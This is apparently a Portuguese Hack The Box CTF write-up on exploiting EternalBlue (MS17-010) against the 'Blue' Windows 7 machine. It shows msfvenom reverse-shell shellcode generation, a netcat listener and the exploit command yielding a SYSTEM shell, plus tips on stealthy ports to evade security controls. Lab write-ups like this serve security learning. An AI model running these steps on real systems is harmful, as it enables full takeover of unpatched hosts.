---
layout: post
title: "[CTF]-[HACKTHEBOX]-[EASY]- BLUE"
date: 2023-01-10
excerpt: "Machine: Support - [Root-me.org](https://www.hackthebox.com)"
tags: [ctf, htb, windows, eternal blue, manual exploit, exploit, python, venv]
---

# Intro

Eu sei, eu sei. Máquina Blue, famigerado shell de 3 minutos utilizando o metasploit, mas aqui vamos separar o joio do trigo utilizando um exploit manual e entender um pouco melhor o processo e impacto de uma vulnerabilidade tão crítica.

# Recon

Easy peasy, nmap de lei, enumerar as portas e nada de serviços web. Sabemos que é um host windows e smb ativo, é o primeiro passo para tentar um acesso inicial ou um acesso completo!

```nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 18:57 EST
Nmap scan report for 10.129.138.157
Host is up (0.077s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.88 seconds
```

Só smb + rpc, nenhuma outra entrada, Windows 7, nome da máquina é Blue. Já sabemos que vamos abusar da vulnerabilidade do Eternal Blue, então vamos tentar detectar se a máquina está vulneravel.

Pode-se utilizar o nmap para validar utilizando o script **/usr/share/nmap/scripts/smb-vuln-ms17-010.nse**, o próprio metasploit (**auxiliary/scanner/smb/smb_ms17_010**) ou o repositório do [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010) caso esteja se preparando pra uma exploração manual (DCPT/OSCP).

nmap:
```nmap_scan
└─# nmap -p 445 --script=smb-vuln-ms17* 10.129.138.157
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-12 13:58 EST
Nmap scan report for 10.129.138.157
Host is up (0.043s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds

```

metasploit:
```metasploit
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.138.157:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.138.157:445    - Scanned 1 of 1 hosts (100% complete)
```

eternal_checker.py:
```eternal_chequer.py
└─# python3 eternal_checker.py 10.129.138.157                          
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Don
```

## Tá, mas e ae?
É isso? Fim de jogo? **yep**. 

Na **minha** perspectiva, aqui a real exploração do alvo só será feita após atutorização do cliente. Quem possui assets vulneraveis ao **EternalBlue** com certeza possui software legado, não utiliza comunicação TLS, há limitações de patchs para não quebrar o negócio e **COM CERTEZA** seu payload vai ocasionar uma **blue screen of death**. O asset final pode ser mesmo um servidor de arquivos, mas em casos reais pode ser também um equipamento critico de um hospital/fábrica, portanto o melhor comportamento como profissional é perguntar se pode-se prosseguir com a exploração ou só o fato se ser vulnerável já é o suficiente.

Nossa atividade é exatamente para identificar as falhas e posteriormente os times responsáveis corrigirem. Se existe a possibilidade se evitarmos um incidente crítico no ambiente, por que não perguntar e solicitar autorização? Eu que não quero estar em war room quando for pra acompanhar esse Disaster Recovery :)

Como é CTF, claro que estamos autorizados!

# Tá autorizado, desce a lenha.

Metasploit 3 minutos e blablabla, esquece isso e vamos explorar manualmente.

Como estamos lidando com um exploit que pode precisar de dependências, eu gosto de utilizar virtualização/containers para executar.  Cito como exemplo o Python + Impackt libs, as diferentes versões do Impackt **SEMPRE** vão causar conflito ou algum bug durante execução. No caso, vou utilizar um exploit em Python e o VENV para virtualizar o ambiente.  Estarei utilizando o exploit do [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010), mas há tantos outros no Github.

Preparando o ambiente VENV:
```VENV
python3 -m pip install virtualenv
mkdir blue && cd blue
python3 -m venv env && source env/bin/activate
python3 -m pip list
```

Nenhuma dependencia instalada (pip list), vamos utilizar o `python3 -m pip install -r requirements.txt` e pronto, podemos isoladamente utilizar o exploit sem ter conflito de dependências com as bibliotecas da máquina.

![Python VENV](/img_posts/ctf/htb/easy/blue/ctf-htb-blue-1.png)

Para preparar o payload, aqui há informações importantes.
- Se atentar a arquitetura do alvo, pode ser **x64** ou **x86**, importante ter isso em mente quando gerar o payload.
- Saber a diferença de um shellcode **stage** e **stageless**. Normalmente o stage vai ocasionar em bluescreen.
- Meterpreter? Não recomendo pois pode ser facilmente identificado por AV/EDR. Utilize como primeira opção o **reverse_tcp**, depois vá para as outras alternativas.
- Utilizei portas altas para a exploração, mas em cenários reais utilize portas comuns para ser **stealth** para a maioria dos controles de segurança, como 443/HTTPS, 8080/TOMCAT ou 9200/ELASTICSEARCH.

```shell_prep
┌──(env)─(root💀kali)-[/home/…/htb/blue/AutoBlue-MS17-010/shellcode]
└─# ./shell_prep.sh                                                                                           130 ⨯
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.10.14.118
LPORT you want x64 to listen on:
4444
LPORT you want x86 to listen on:
5555
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.118 LPORT=4444
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...
msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.118 LPORT=5555
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE

```

Sem segredo, abrir um listener com netcat na porta da arquitetura identificada na fase de recon e executar o exploit com: `python3 eternalblue_exploit7.py 10.129.138.157 shellcode/sc_x64.bin`
```
┌──(root💀kali)-[/home/kali]
└─# nc -nlvp 4444                                                                                               1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.118] from (UNKNOWN) [10.129.138.157] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Como temos uma shell com **NT/SYSTEM**, não é necessário escalar privilégios, só pegar as flags de user e root.

# Mitigação
- patch your shit!